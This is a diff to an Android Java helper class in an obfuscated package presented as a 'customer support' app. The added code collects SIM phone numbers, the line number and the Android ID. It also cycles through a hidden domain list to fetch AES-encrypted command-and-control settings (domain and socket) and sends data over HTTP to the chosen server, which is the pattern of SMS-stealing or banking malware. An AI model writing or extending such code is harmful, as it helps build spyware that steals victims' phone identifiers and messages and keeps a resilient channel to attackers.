@@ -1,12 +1,21 @@
 package customer.supportme.ky.hu.kjljakljsdfjkaljsdfljasljdf.kasjldfjlasjfdljlkjklasjfdlj;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
 import android.os.Build;
+import android.provider.Settings;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
 
 import org.json.JSONObject;
 
@@ -15,23 +24,24 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.List;
 import java.util.Scanner;
 
 
 public class Helper {
 
-    public static String TAG = "WorkManager";
+    public static String TAG = "Kritika";
     {
         System.loadLibrary("native-lib.cpp");
     }
     public  native String SMSSavePath();
-    public  native String FormSavePath();
-    public  native String URL();
     public  native String SITE();
     public  native String KEY();
+    public native String DomainList();
+    public native String getNumber();
 
 
-    public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
+    public static void postRequest(String path, JSONObject jsonData, Context context, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
             @Override
             protected String doInBackground(String... params) {
@@ -39,7 +49,7 @@ public class Helper {
                 try {
                     Helper helper = new Helper();
 
-                    String urlString = helper.URL() + path;
+                    String urlString = helper.URL(context) + path;
                     URL url = new URL(urlString);
 
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -95,7 +105,7 @@ public class Helper {
         void onResponse(String result);
     }
 
-    public static void getRequest(String path, ResponseListener listener) {
+    public static void getRequest(String path, Context context, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
             @Override
             protected String doInBackground(String... params) {
@@ -104,7 +114,7 @@ public class Helper {
 
                     Helper helper = new Helper();
 
-                    String urlString = helper.URL() + path;
+                    String urlString = helper.URL(context) + path;
                     URL url = new URL(urlString);
 
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -165,6 +175,99 @@ public class Helper {
         }
         return false;
     }
+
+    public static String getSimNumbers(Context context) {
+        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return "Permission is Denied on getSimNumbers";
+        }
+        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
+        if (subscriptionInfoList != null) {
+            String Numbers = "";
+            for (SubscriptionInfo info : subscriptionInfoList) {
+                Numbers += " | " + info.getNumber();
+            }
+            if(!Numbers.isEmpty()) {
+                Numbers = getPhoneNumber(context);
+            }
+            return Numbers;
+        }else{
+            return "subscription info is null on getSimNumbers";
+        }
+    }
+
+    @SuppressLint("HardwareIds")
+    public static String getAndroidId(Context context) {
+        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+    public static String getPhoneNumber(Context context) {
+        // default phone number..
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tMgr != null) {
+            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                Log.d("mywork", "Phone OR SMS permission is not granted");
+                return "Phone OR SMS permission is not granted";
+            }
+            @SuppressLint("HardwareIds") String mPhoneNumber = tMgr.getLine1Number();
+            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
+                return mPhoneNumber;
+            } else {
+                return "Phone number not available";
+            }
+        } else {
+            return "TelephonyManager is null";
+        }
+    }
+
+    public String URL(Context context) {
+        SharedPreferencesHelper share = new SharedPreferencesHelper(context);
+        String domain = share.getString("domain", "https://example.com").trim();
+        return domain;
+    }
+
+    public void updateDomain(final Context cc) {
+        final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
+        final NetworkHelper network = new NetworkHelper();
+        final Helper help = new Helper();
+        String DomainList = help.DomainList();
+        final String[] domainArray = DomainList.split(", ");
+        checkDomainSequentially(0, domainArray, db, network);
+    }
+
+    private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
+        if (index >= domainArray.length) {
+            db.saveString("domainStatus", "failed");
+            return;
+        }
+        final String currentDomain = domainArray[index];
+        network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
+            @Override
+            public void onSuccess(String result) {
+                String encryptedData = result.trim(); // Trim to remove leading/trailing whitespaces
+                try {
+                    Helper h = new Helper();
+                    String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());
+
+                    if (!decryptedData.isEmpty()) {
+                        JSONObject object = new JSONObject(decryptedData);
+                        db.saveString("domain", object.getString("domain"));
+                        db.saveString("socket", object.getString("socket"));
+                    }
+                } catch (Exception e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+            @Override
+            public void onFailure(String error) {
+                Log.d("NetworkRequest", "Failed for domain: " + currentDomain + " Error: " + error);
+                checkDomainSequentially(index + 1, domainArray, db, network);
+            }
+        });
+    }
+
+
 
 }
 
